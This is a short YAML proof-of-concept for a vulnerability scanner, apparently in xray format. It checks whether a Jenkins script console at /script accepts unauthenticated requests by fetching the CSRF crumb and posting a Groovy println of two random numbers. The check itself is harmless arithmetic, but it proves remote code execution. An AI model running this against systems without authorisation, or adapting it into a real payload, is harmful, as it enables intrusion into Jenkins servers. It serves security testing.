name: poc-yaml-jenkins-unauth
set:
  r1: randomInt(1000, 2000)
  r2: randomInt(1000, 2000)
rules:
  - method: GET
    path: /script
    follow_redirects: false
    expression: response.status == 200
    search: |
      "Jenkins-Crumb", "(?P<var>.+?)"\);
  - method: POST
    path: /script
    body: |
      script=println+%28{{r1}}%2B{{r2}}%29%3B&Jenkins-Crumb={{var}}&Submit=%E8%BF%90%E8%A1%8C
    expression: response.status == 200 && response.body.bcontains(bytes(string(r1 + r2)))
detail:
  author: MrP01ntSun
  links:
    - https://www.cnblogs.com/yuzly/p/11255609.html
    - https://blog.51cto.com/13770310/2156663
